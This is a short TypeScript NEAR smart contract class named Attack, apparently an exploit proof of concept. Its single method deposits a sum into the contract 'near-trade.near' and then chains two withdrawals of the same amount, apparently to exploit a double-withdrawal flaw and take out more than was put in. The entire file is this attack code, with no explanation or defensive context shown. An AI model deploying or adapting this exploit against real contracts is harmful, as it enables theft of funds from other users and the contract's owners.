```typescript
import { NearBindgen, call, NearPromise, near } from 'near-sdk-js';

const GAS = 50_000_000_000_000n;
const NO_DEPOSIT = 0n;

@NearBindgen({})
class Attack {
  @call({})
  attack() {
    const balance = 5_000_000n;

    return NearPromise.new('near-trade.near')
      .functionCall('near_deposit', '', balance.toString(), GAS)
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      )
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      );
  }
}
```
